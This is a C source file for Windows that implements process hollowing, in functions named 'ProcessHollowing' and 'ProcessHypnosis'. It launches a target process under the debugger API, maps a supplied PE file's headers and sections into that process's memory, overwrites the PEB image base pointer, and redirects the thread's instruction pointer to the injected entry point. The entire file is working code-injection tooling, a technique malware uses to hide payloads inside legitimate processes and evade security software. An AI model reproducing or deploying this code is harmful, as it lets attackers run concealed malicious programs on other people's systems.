#include "box.h"

BOOL CreateDebuggedProcess
(
	IN LPCSTR ProcessName,
	OUT DWORD* TID,
	OUT DWORD* PID,
	OUT HANDLE* hProcess,
	OUT HANDLE* hThread
)
{
	if (!hProcess || !hThread || !PID)
		return FALSE;

	STARTUPINFOA StartupInfo;
	PROCESS_INFORMATION ProcessInformation;

	RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&ProcessInformation, sizeof(PROCESS_INFORMATION));
	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &StartupInfo, &ProcessInformation))
	{
		WARN("Failed To Create a New Debuged Process of %s", ProcessName);
		PRINT_ERROR("CreateProcessA");
		return FALSE;
	}

	printf(
		"Newly Created Process\n"
		"\\___[%ld] TID\n"
		"\\___[%ld] PID\n"
		"\\___[0x%p] hProcess\n"
		"\\___[0x%p] hThread\n",
		ProcessInformation.dwThreadId, ProcessInformation.dwProcessId, ProcessInformation.hProcess, ProcessInformation.hThread);

	*TID = ProcessInformation.dwThreadId;
	*PID = ProcessInformation.dwProcessId;
	*hProcess = ProcessInformation.hProcess;
	*hThread = ProcessInformation.hThread;

	return TRUE;

}

BOOL ReadTargetFile
(
	IN LPCSTR PeName,
	OUT LPVOID* lpBuffer,
	OUT DWORD* nNumberOfBytesToRead
)

{

	HANDLE	hFile = NULL;
	BOOL	State = TRUE;
	DWORD	lpNumberOfBytesRead = 0;
	DWORD	NumberOfBytesToRead = 0;
	LPVOID	lppBuffer = NULL;

	if (!PeName || !lpBuffer || !nNumberOfBytesToRead)
		return FALSE;

	if ((hFile = CreateFileA(PeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		PRINT_ERROR("CreateFileA");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Current File Handle", hFile);


	if ((NumberOfBytesToRead = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE)
	{
		PRINT_ERROR("GetFileSize");
		State = FALSE; goto CLEANUP;
	}

	INFO("[%ld] Current File Size", NumberOfBytesToRead);


	if ((lppBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, NumberOfBytesToRead)) == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto CLEANUP;
	}

	INFO("[%ld] Allocated Bytes to Buffer", NumberOfBytesToRead);


	if (!ReadFile(hFile, lppBuffer, NumberOfBytesToRead, &lpNumberOfBytesRead, NULL))
	{
		PRINT_ERROR("ReadFile");
		State = FALSE; goto CLEANUP;
	}

	OKAY("Successfully Read File!");

	*lpBuffer = lppBuffer;
	*nNumberOfBytesToRead = NumberOfBytesToRead;

CLEANUP:

	if (hFile)
		CloseHandle(hFile);

	return State;

}

BOOL ProcessHollowing
(
	IN DWORD PID,
	IN HANDLE hThread,
	IN HANDLE hProcess,
	IN LPVOID* rBuffer,
	IN LPVOID lppBuffer,
	OUT DWORD* Delta
)
{

	BOOL	State = TRUE;
	DWORD	dwOldProt = 0,
			RelocOffset = 0,
			dwProt = 0;
	SIZE_T	lpNumOfBytesWritten = 0;

	PBYTE pBase = (PBYTE)lppBuffer;

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		PRINT_ERROR("Magic Letters");
		return FALSE;
	}

	PIMAGE_NT_HEADERS64 pImgNt = (PIMAGE_NT_HEADERS64)((DWORD_PTR)pBase + pImgDos->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
	{
		PRINT_ERROR("Nt Signature");
		return FALSE;
	}

	PIMAGE_OPTIONAL_HEADER pImgOpt = &pImgNt->OptionalHeader;

	PIMAGE_SECTION_HEADER pImgSecHeader = IMAGE_FIRST_SECTION(pImgNt);

	PIMAGE_DATA_DIRECTORY pImgDataDir64 = &pImgOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	if ((*rBuffer = VirtualAllocEx(hProcess, (LPVOID)pImgNt->OptionalHeader.ImageBase, (SIZE_T)pImgNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL)
	{
		PRINT_ERROR("VirtualAllocEx");
		State = FALSE; goto CLEANUP;
	}

	LPVOID RemoteBase = *rBuffer;

	INFO("[0x%p] Remote Base Address", RemoteBase);

	DWORD64 dwDelta = (DWORD64)RemoteBase - pImgNt->OptionalHeader.ImageBase;

	printf(
		"[v] [0x%p] Source Image Base\n"
		"[v] [0x%p] Dest Image Base\n"
		"[v] [0x%p] Relocation Delta\n",
		pImgNt->OptionalHeader.ImageBase,
		RemoteBase,
		dwDelta
	);

	if (!WriteProcessMemory(hProcess, RemoteBase, lppBuffer, pImgNt->OptionalHeader.SizeOfHeaders, &lpNumOfBytesWritten))
	{
		PRINT_ERROR("WriteProcessMemory");
		State = FALSE; goto CLEANUP;
	}

	INFO("Wrote Process Memory --> [0x%p] With Size --> [%d]", RemoteBase, pImgNt->OptionalHeader.SizeOfHeaders);

	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
	{

		if (!pImgSecHeader[i].PointerToRawData)
			continue;

		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				dwProt = PAGE_EXECUTE_READWRITE;
			else
				dwProt = PAGE_EXECUTE_READ;
		}
		else {
			if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				dwProt = PAGE_READWRITE;
			else
				dwProt = PAGE_READONLY;
		}

		PVOID SecBaseAddress = (PVOID)((PBYTE)RemoteBase + pImgSecHeader[i].VirtualAddress);
		PVOID SecBuffer = (PVOID)((PBYTE)lppBuffer + pImgSecHeader[i].PointerToRawData);
		SIZE_T size = pImgSecHeader[i].Misc.VirtualSize;

		if (pImgSecHeader[i].SizeOfRawData) {
			if (!WriteProcessMemory(hProcess, SecBaseAddress, SecBuffer, pImgSecHeader[i].SizeOfRawData, &lpNumOfBytesWritten))
			{
				PRINT_ERROR("WriteProcessMemory");
				State = FALSE; goto CLEANUP;
			}
		}

		if (!VirtualProtectEx(hProcess, SecBaseAddress, size, dwProt, &dwOldProt))
		{
			PRINT_ERROR("VirtualProtectEx");
			State = FALSE; goto CLEANUP;
		}

		OKAY("Wrote [%s] section --> at [0x%p] Base Address With Size --> [%d]", pImgSecHeader[i].Name, SecBaseAddress, pImgSecHeader[i].SizeOfRawData);


	}

CLEANUP:

	return State;

}

BOOL ProcessHypnosis
(
	IN LPVOID lppBuffer,
	IN PVOID *rBuffer,
	IN DWORD PID,
	IN HANDLE hProcess
)
{
	BOOL State = TRUE;

	PROCESS_BASIC_INFORMATION pbi;
	RtlSecureZeroMemory(&pbi, sizeof(pbi));

	DEBUG_EVENT dEvent;
	RtlSecureZeroMemory(&dEvent, sizeof(DEBUG_EVENT));

	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");

	pNtQueryInformationProcess NtQueryInformationProcess =
		(pNtQueryInformationProcess)GetProcAddress(
			hNtdll,
			"NtQueryInformationProcess"
		);

	PBYTE pBase = (PBYTE)lppBuffer;

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		PRINT_ERROR("Magic Letters");
		return FALSE;
	}

	PIMAGE_NT_HEADERS64 pImgNt = (PIMAGE_NT_HEADERS64)((DWORD_PTR)pBase + pImgDos->e_lfanew);
	if (pImgNt->Signature != IMAGE_NT_SIGNATURE)
	{
		PRINT_ERROR("Nt Signature");
	}


		while (WaitForDebugEvent(&dEvent, INFINITE))
		{

			switch (dEvent.dwDebugEventCode)
			{

			case CREATE_PROCESS_DEBUG_EVENT:

				/*Contains Process Creation Info that can be used by a Debugger*/

				printf(
					"[x] DEBUG INFO\n"
					"[x] Main Thread: [0x%p]\n"
					"[x] lpStartAddress: [0x%p]\n",
					dEvent.u.CreateProcessInfo.hThread, dEvent.u.CreateProcessInfo.lpStartAddress);

				CONTEXT ThreadCtx;
				RtlSecureZeroMemory(&ThreadCtx, sizeof(CONTEXT));
				ThreadCtx.ContextFlags = CONTEXT_FULL;

				if (!NT_SUCCESS(NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL)))
				{
					WARN("Failed to Grab ProcessBasicInformation!");
					State = FALSE; goto CLEANUP;
				}

				PVOID peb = pbi.PebBaseAddress;
				PVOID NewBase = *rBuffer;

				HANDLE hEvtThread = OpenThread(
					THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
					FALSE,
					dEvent.dwThreadId
				);

				if (!GetThreadContext(hEvtThread, &ThreadCtx))
				{
					WARN("Failed To Get Thread Context!");
					PRINT_ERROR("GetThreadContext");
					State = FALSE; goto CLEANUP;
				}

				printf("Exception @ %p\n",
					dEvent.u.Exception.ExceptionRecord.ExceptionAddress);
				printf("RDX: 0x%p\n", (void*)ThreadCtx.Rdx);

				if (!WriteProcessMemory(hProcess, (PBYTE)peb + 0x10, &NewBase, sizeof(NewBase), NULL))
				{
					WARN("Failed To Write Process Memory");
					PRINT_ERROR("WriteProcessMemory");
					State = FALSE; goto CLEANUP;
				}

				ThreadCtx.Rip = (DWORD64)((PBYTE)(*rBuffer) + pImgNt->OptionalHeader.AddressOfEntryPoint);

				if (!SetThreadContext(hEvtThread, &ThreadCtx))
				{
					WARN("Failed To Set Thread Context");
					PRINT_ERROR("SetThreadContext");
					State = FALSE; goto CLEANUP;
				}

				CloseHandle(hEvtThread);

				break;

			case CREATE_THREAD_DEBUG_EVENT:

				/*Information about newly created threads*/

				printf(
					"[x] Thread lpStartAddress: [0x%p]\n"
					"[x] ThreadLocalBase: [0x%p]\n",
					dEvent.u.CreateThread.lpStartAddress, dEvent.u.CreateThread.lpThreadLocalBase);

				break;

			case EXCEPTION_DEBUG_EVENT:

				if (dEvent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT)
				{

					INFO("Breakpoint Triggered!");
					INFO("[RIP] --> [0x%p]", dEvent.u.Exception.ExceptionRecord.ExceptionAddress);
					break;
				}

			}

			if (!ContinueDebugEvent(dEvent.dwProcessId, dEvent.dwThreadId, DBG_CONTINUE))
			{
				WARN("Failed To Continue Debuged Event!");
				PRINT_ERROR("ContinueDebugEvent");
				return FALSE;
			}
			continue;

		}

		if (!DebugActiveProcessStop(PID))
		{
			WARN("Failed to unfreeze hThread!");
			PRINT_ERROR("DebugActiveProcessStop");
			return FALSE;
		}

CLEANUP:

	return State;

}